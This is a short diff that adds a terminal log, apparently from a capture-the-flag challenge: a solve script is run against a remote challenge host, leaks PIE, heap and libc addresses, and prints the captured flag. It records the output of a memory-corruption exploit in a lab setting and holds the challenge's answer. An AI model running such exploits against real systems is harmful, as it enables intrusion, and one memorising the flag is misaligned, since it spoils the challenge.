@@ -1,0 +1,7 @@
+$ python3 solve.py --solve \
+    --host paperweight-f538a065aef9.chals.z0d1ak.org \
+    --port 1337 --timeout 12
+[+] PIE: 0x7f2163b19000, heap Folio: 0x555570409400
+[+] libc: 0x7f21632c8000
+[+] trying flag.txt
+zdk{ThE_Sc4nlIN3_5AnK_8ELOw_32_bI75}
